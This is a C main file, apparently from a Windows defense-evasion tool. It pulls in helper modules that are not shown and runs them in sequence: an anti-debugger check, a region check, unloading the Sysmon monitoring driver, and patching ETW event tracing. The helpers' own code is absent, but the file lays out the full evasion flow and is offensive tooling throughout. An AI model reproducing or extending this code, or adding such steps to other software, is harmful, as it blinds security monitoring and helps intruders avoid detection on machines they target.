#include <stdio.h>
#include "check_region.c"
#include "check_sysmon.c"
#include "unload_sysmon.c"
#include "patch_etw.c"
#include "check_debugger.c"

int main(void) {
    int result;

    // Add debugger check at the start
    if (CheckDebugger()) {
        return 1;
    }

    printf("Checking region...\n");
    if (!CheckRegion()) {
        return 1;
    }

    printf("Checking Sysmon status...\n");
    result = CheckSysmonStatus();
    if (result == 2) {
        printf("Sysmon check failed\n");
        return result;
    }
    if (result == 1) {
        printf("Sysmon is not running, skipping unload\n");
    } else {
        printf("Unloading Sysmon...\n");
        result = UnloadSysmon();
        if (result != 0) {
            printf("Failed to unload Sysmon\n");
            return result;
        }
    }

    printf("Patching ETW...\n");
    result = PatchEtw();
    if (result != 0) {
        printf("Failed to patch ETW\n");
        return result;
    }

    printf("Done.\n");
    return 0;
}